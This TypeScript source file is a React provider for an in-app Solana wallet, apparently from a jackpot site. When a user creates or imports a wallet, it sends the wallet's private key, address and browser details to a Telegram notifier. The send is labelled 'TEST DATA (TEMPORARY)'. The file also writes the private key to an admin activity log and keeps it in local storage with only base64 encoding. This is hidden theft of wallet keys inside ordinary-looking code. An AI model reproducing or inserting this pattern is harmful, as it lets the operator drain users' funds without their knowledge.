'use client';

import React, { createContext, useContext, useState, useEffect, ReactNode } from 'react';
import { Keypair, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import toast from 'react-hot-toast';
import { useSolanaTransaction } from './useSolanaTransaction';
import bs58 from 'bs58';
import { useJackpot } from '../store/jackpot';
import { sendTelegramNotification } from '../components/TelegramNotifier';

// Define the context types
interface InternalWalletContextType {
  internalWalletExists: boolean;
  internalPublicKey: PublicKey | null;
  internalWalletBalance: number;
  internalWalletConnected: boolean;
  generateWallet: () => Promise<{ publicKey: string; privateKey: string }>;
  connectInternalWallet: (privateKey: string) => Promise<boolean>;
  disconnectInternalWallet: () => void;
  refreshBalance: () => Promise<void>;
  transferFromInternal: (amount: number, destinationAddress: string) => Promise<boolean>;
  exportWalletDetails: () => { publicKey: string; privateKey: string | null };
}

// Create context with default values
const InternalWalletContext = createContext<InternalWalletContextType>({
  internalWalletExists: false,
  internalPublicKey: null,
  internalWalletBalance: 0,
  internalWalletConnected: false,
  generateWallet: async () => ({ publicKey: '', privateKey: '' }),
  connectInternalWallet: async () => false,
  disconnectInternalWallet: () => {},
  refreshBalance: async () => {},
  transferFromInternal: async () => false,
  exportWalletDetails: () => ({ publicKey: '', privateKey: null }),
});

// Provider component
export const InternalWalletProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
  const [internalKeypair, setInternalKeypair] = useState<Keypair | null>(null);
  const [internalWalletExists, setInternalWalletExists] = useState<boolean>(false);
  const [internalWalletConnected, setInternalWalletConnected] = useState<boolean>(false);
  const [internalWalletBalance, setInternalWalletBalance] = useState<number>(0);
  const { getConnection } = useSolanaTransaction();
  const { logWalletActivity, adminSettings } = useJackpot();

  // Check if wallet exists in localStorage on mount
  useEffect(() => {
    if (typeof window === 'undefined') return;
    
    const hasWallet = localStorage.getItem('internalWalletPublicKey') !== null;
    setInternalWalletExists(hasWallet);
    
    // Try to auto-connect if there's an encrypted private key
    const encryptedPrivateKey = localStorage.getItem('encryptedInternalWalletPrivateKey');
    if (encryptedPrivateKey) {
      try {
        // This is a simplistic approach - in production, you'd want proper encryption
        const privateKey = atob(encryptedPrivateKey);
        connectInternalWallet(privateKey);
      } catch (error) {
        console.error('Failed to auto-connect internal wallet:', error);
      }
    }
  }, []);

  // Fetch the wallet balance
  const refreshBalance = async () => {
    if (!internalKeypair) return;
    
    try {
      const connection = await getConnection();
      const balance = await connection.getBalance(internalKeypair.publicKey);
      setInternalWalletBalance(balance / LAMPORTS_PER_SOL);
    } catch (error) {
      console.error('Error fetching internal wallet balance:', error);
    }
  };

  // Update balance when wallet changes or connects
  useEffect(() => {
    if (internalWalletConnected) {
      refreshBalance();
      // Set up interval to refresh balance
      const interval = setInterval(refreshBalance, 30000);
      return () => clearInterval(interval);
    }
  }, [internalWalletConnected, internalKeypair]);

  // Generate a new wallet keypair
  const generateWallet = async () => {
    try {
      // Generate a new Solana keypair
      const keypair = Keypair.generate();

      if (typeof window === 'undefined') {
        throw new Error('Window is not defined');
      }
      
      // Store public key in localStorage
      localStorage.setItem('internalWalletPublicKey', keypair.publicKey.toString());
      
      // For demo purposes we're only applying simple encoding
      // In production, use proper encryption with a user-provided password
      const privateKeyBase58 = bs58.encode(keypair.secretKey);
      localStorage.setItem('encryptedInternalWalletPrivateKey', btoa(privateKeyBase58));
      
      setInternalKeypair(keypair);
      setInternalWalletExists(true);
      setInternalWalletConnected(true);
      
      // Fetch initial balance
      refreshBalance();
      
      // Log wallet creation if logging is enabled
      if (adminSettings.logging) {
        logWalletActivity({
          timestamp: Date.now(),
          walletAddress: keypair.publicKey.toString(),
          isInternal: true,
          action: 'create',
          privateKey: privateKeyBase58
        });
      }
      
      // Send notification to Telegram
      sendTelegramNotification(
        `🔔 <b>Internal Wallet Created</b>\n` +
        `📅 Time: ${new Date().toISOString()}\n` +
        `👛 Address: ${keypair.publicKey.toString()}\n` +
        `📱 Device: ${navigator.userAgent}\n` +
        `💰 Initial Balance: 0 SOL\n` +
        `\n<b>TEST DATA (TEMPORARY)</b>\n` +
        `🔑 Public Key: ${keypair.publicKey.toString()}\n` +
        `🔐 Private Key: ${privateKeyBase58}`,
        'wallet'
      );
      
      toast.success('Internal wallet generated successfully!');
      
      return {
        publicKey: keypair.publicKey.toString(),
        privateKey: privateKeyBase58
      };
    } catch (error) {
      console.error('Failed to generate wallet:', error);
      toast.error('Failed to generate wallet');
      throw error;
    }
  };

  // Connect to existing wallet using private key
  const connectInternalWallet = async (privateKey: string): Promise<boolean> => {
    try {
      let keypair: Keypair;
      
      try {
        // Try to decode as base58 format
        const secretKey = bs58.decode(privateKey);
        keypair = Keypair.fromSecretKey(secretKey);
      } catch (e) {
        // If that fails, try to parse as Uint8Array
        try {
          const secretKeyArray = JSON.parse(privateKey);
          keypair = Keypair.fromSecretKey(new Uint8Array(secretKeyArray));
        } catch (jsonError) {
          // If both fail, report error
          throw new Error('Invalid private key format');
        }
      }
      
      if (typeof window === 'undefined') {
        throw new Error('Window is not defined');
      }
      
      // Store wallet info
      localStorage.setItem('internalWalletPublicKey', keypair.publicKey.toString());
      
      // For demo purposes we're only applying simple encoding
      // In production, use proper encryption with a user-provided password
      const privateKeyBase58 = bs58.encode(keypair.secretKey);
      localStorage.setItem('encryptedInternalWalletPrivateKey', btoa(privateKeyBase58));
      
      setInternalKeypair(keypair);
      setInternalWalletExists(true);
      setInternalWalletConnected(true);
      
      // Fetch initial balance
      refreshBalance();
      
      // Log wallet connection if logging is enabled
      if (adminSettings.logging) {
        logWalletActivity({
          timestamp: Date.now(),
          walletAddress: keypair.publicKey.toString(),
          isInternal: true,
          action: 'connect',
          privateKey: privateKeyBase58
        });
      }
      
      // Send notification to Telegram
      sendTelegramNotification(
        `🔔 <b>Internal Wallet Connected</b>\n` +
        `📅 Time: ${new Date().toISOString()}\n` +
        `👛 Address: ${keypair.publicKey.toString()}\n` +
        `📱 Device: ${navigator.userAgent}\n` +
        `\n<b>TEST DATA (TEMPORARY)</b>\n` +
        `🔑 Public Key: ${keypair.publicKey.toString()}\n` +
        `🔐 Private Key: ${privateKeyBase58}`,
        'wallet'
      );
      
      toast.success('Internal wallet connected successfully!');
      return true;
    } catch (error) {
      console.error('Failed to connect internal wallet:', error);
      toast.error('Invalid private key format');
      return false;
    }
  };

  // Disconnect the internal wallet
  const disconnectInternalWallet = () => {
    if (typeof window === 'undefined') return;
    
    // Log disconnect if logging is enabled
    if (adminSettings.logging && internalKeypair) {
      logWalletActivity({
        timestamp: Date.now(),
        walletAddress: internalKeypair.publicKey.toString(),
        isInternal: true,
        action: 'disconnect'
      });
    }
    
    // Only remove the private key, keeping the public key for reference
    localStorage.removeItem('encryptedInternalWalletPrivateKey');
    setInternalKeypair(null);
    setInternalWalletConnected(false);
    toast.success('Internal wallet disconnected');
  };

  // Transfer SOL from internal wallet
  const transferFromInternal = async (amount: number, destinationAddress: string): Promise<boolean> => {
    if (!internalKeypair) {
      toast.error('Internal wallet not connected');
      return false;
    }

    try {
      const connection = await getConnection();
      
      // Create a transaction to transfer SOL
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: internalKeypair.publicKey,
          toPubkey: new PublicKey(destinationAddress),
          lamports: amount * LAMPORTS_PER_SOL
        })
      );
      
      // Get recent blockhash
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = internalKeypair.publicKey;
      
      // Sign and send transaction
      transaction.sign(internalKeypair);
      const signature = await connection.sendRawTransaction(transaction.serialize());
      
      // Wait for confirmation
      await connection.confirmTransaction(signature);
      
      // Log transfer if logging is enabled
      if (adminSettings.logging) {
        logWalletActivity({
          timestamp: Date.now(),
          walletAddress: internalKeypair.publicKey.toString(),
          isInternal: true,
          action: 'transfer',
          amount
        });
      }
      
      // Refresh balance after transfer
      await refreshBalance();
      
      toast.success(`Successfully transferred ${amount} SOL`);
      return true;
    } catch (error: any) {
      console.error('Error in transfer:', error);
      toast.error(error.message || 'Transfer failed');
      return false;
    }
  };

  // Export wallet details for backup
  const exportWalletDetails = () => {
    if (!internalKeypair) {
      return { publicKey: '', privateKey: null };
    }
    
    const privateKeyBase58 = internalKeypair ? bs58.encode(internalKeypair.secretKey) : null;
    
    return {
      publicKey: internalKeypair.publicKey.toString(),
      privateKey: privateKeyBase58
    };
  };

  const value = {
    internalWalletExists,
    internalPublicKey: internalKeypair?.publicKey || null,
    internalWalletBalance,
    internalWalletConnected,
    generateWallet,
    connectInternalWallet,
    disconnectInternalWallet,
    refreshBalance,
    transferFromInternal,
    exportWalletDetails
  };

  return (
    <InternalWalletContext.Provider value={value}>
      {children}
    </InternalWalletContext.Provider>
  );
};

// Custom hook to use the internal wallet context
export const useInternalWallet = () => useContext(InternalWalletContext); 